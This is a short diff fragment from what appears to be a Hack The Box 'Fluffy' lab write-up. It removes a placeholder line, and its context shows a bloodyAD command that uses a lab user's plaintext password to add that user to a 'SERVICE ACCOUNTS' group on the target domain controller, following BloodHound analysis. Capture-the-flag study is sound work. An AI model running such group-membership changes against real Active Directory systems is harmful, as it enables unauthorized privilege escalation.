@@ -152,8 +152,6 @@ unzip the bloodhound.zip and upload it in bloodhoud.
 
 Search for the `managers@fluffy.htb` service account.
 
-<snip>
-
 `bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila` 
 
 ![image.png](/images/HTB_Fluffy/image%2017.png)
